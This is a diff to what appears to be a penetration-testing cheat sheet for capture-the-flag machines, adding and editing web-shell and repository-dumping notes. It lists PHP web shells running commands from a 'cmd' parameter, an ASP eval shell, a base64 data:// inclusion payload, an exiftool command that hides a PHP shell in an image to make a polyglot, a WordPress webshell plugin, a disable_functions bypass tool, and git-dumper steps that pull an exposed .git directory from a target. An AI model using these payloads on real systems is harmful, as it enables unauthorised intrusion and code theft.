@@ -353,7 +353,14 @@ data://text/plain;base64,<base64>&cmd=ls
 <?php echo(system($_GET["cmd"])); ?>
 <?php echo(shell_exec($_GET["cmd"])); ?>
 <?php echo(exec($_GET["cmd"]));?>
+
+<?php phpinfo();?>
 ```
+Dfunc - php
+```bash
+git clone https://github.com/teambi0s/dfunc-bypasser
+```
+asp
 ```asp
 <% eval request('cmd') %>
 ```
@@ -364,7 +371,7 @@ echo "AddType application/x-httpd-php .tak" > .htaccess
 ```
 polyglot
 ```
-exiftool -Comment='<?php echo "START\n"; echo(exec($_GET["cmd"])); echo "\nEND"; ?>' unnamed.jpg -o polyglot.php
+exiftool -Comment='<?php echo "START\n"; echo(system($_GET["cmd"])); echo "\nEND"; ?>' unnamed.jpg -o polyglot.php
 ```
 Wordpress <br/>
 https://github.com/p0dalirius/Wordpress-webshell-plugin
@@ -1071,13 +1078,22 @@ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32
 # git dump
 git clone https://github.com/internetwache/GitTools.git
 cd GitTools/Dumper 
-./gitdumper.sh http://pilgrimage.htb/.git/ git
+./gitdumper.sh http://pilgrimage.htb/.git/ web
+
+# git
+git clone https://github.com/arthaud/git-dumper
+cd git-dumper 
+python -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt
+./git_dumper.py http://pilgrimage.htb/.git/ web
 
 # cmd
 git status
 git log
 git show [commit]
 git reset --hard
+git checkout . 
 ```
 
 # Privilege Escalation
